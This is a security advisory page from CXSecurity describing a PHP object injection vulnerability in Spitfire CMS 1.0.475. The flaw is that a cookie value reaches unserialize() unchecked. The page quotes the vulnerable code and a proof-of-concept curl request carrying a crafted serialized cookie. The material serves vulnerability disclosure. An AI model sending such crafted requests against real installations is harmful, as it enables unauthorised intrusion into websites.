---
title: Spitfire CMS 1.0.475 PHP Object Injection
url: https://cxsecurity.com/issue/WLB-2022120026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-12
fetch_date: 2025-10-04T01:14:10.228972
---

# Spitfire CMS 1.0.475 PHP Object Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Spitfire CMS 1.0.475 PHP Object Injection** **2022.12.11**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Spitfire CMS 1.0.475 (cms\_backup\_values) PHP Object Injection
Vendor: Claus Muus
Product web page: http://spitfire.clausmuus.de
Affected version: 1.0.475
Summary: Spitfire is a system to manage the content of webpages.
Desc: The application is prone to a PHP Object Injection vulnerability
due to the unsafe use of unserialize() function. A potential attacker,
authenticated, could exploit this vulnerability by sending specially
crafted requests to the web application containing malicious serialized
input.
-----------------------------------------------------------------------
cms/edit/tpl\_backup.inc.php:
----------------------------
47: private function status ()
48: {
49: $status = array ();
50:
51: $status['values'] = array ();
52: $status['values'] = isset ($\_COOKIE['cms\_backup\_values']) ? unserialize ($\_COOKIE['cms\_backup\_values']) : array ();
...
...
77: public function save ($values)
78: {
79: $values = array\_merge ($this->status['values'], $values);
80: setcookie ('cms\_backup\_values', serialize ($values), time()+60\*60\*24\*30);
81: }
-----------------------------------------------------------------------
Tested on: nginx
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2022-5720
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5720.php
28.09.2022
--
> curl -isk -XPOST http://10.0.0.2/cms/edit/tpl\_backup\_action.php \
-H 'Content-Type: application/x-www-form-urlencoded'
-H 'Accept: \*/\*'
-H 'Referer: http://10.0.0.2/cms/edit/cont\_index.php?tpl=backup'
-H 'Accept-Encoding: gzip, deflate'
-H 'Accept-Language: en-US,en;q=0.9'
-H 'Connection: close' \
-H 'Cookie: tip=0; cms\_backup\_values=O%3a3%3a%22ZSL%22%3a0%3a%7b%7d; cms\_username=admin; PHPSESSID=0e63d3a8762f4bff95050d1146db8c1c' \
--data 'action=save&&value=1'
#--data 'action=save&&value[files]={}'

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top